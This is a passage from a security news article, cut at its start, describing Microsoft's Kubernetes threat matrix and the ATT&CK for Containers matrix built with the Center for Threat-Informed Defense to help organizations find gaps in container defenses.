necessary, require that they be protected behind authentication barriers.\nMicrosoft has also published a threat matrix for Kubernetes to better understand the attack surface of containerized environments and assist organizations in identifying current gaps in their defenses to secure against threats targeting Kubernetes.\nEarlier this April, the company, alongside other members of Center for Threat-Informed Defense, teamed up to release what’s called the ATT&CK for Containers matrix that builds upon the Kubernetes threat matrix to detect “risks associated with containers, including misconfigurations that are often the initial vector for attacks, as well as the specific implementation of attack techniques in the wild.“\n\n\nFound this article interesting?
